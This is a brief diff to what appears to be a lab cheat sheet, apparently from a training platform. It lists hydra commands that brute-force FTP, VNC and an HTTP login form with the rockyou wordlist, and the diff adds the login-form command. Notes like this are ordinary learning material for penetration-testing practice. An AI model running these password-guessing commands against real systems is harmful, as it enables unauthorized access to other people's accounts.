@@ -6,3 +6,6 @@ hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.195.6 ftp - bru
 
 hydra -P /usr/share/wordlists/rockyou.txt -vV 10.10.99.166 vnc - vnc protocol doesn't need username
 
+hydra -t 4 -l molly -P /usr/share/wordlists/rockyou.txt -vV 10.10.206.24 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect":
+login form bruteforce with username and password
+
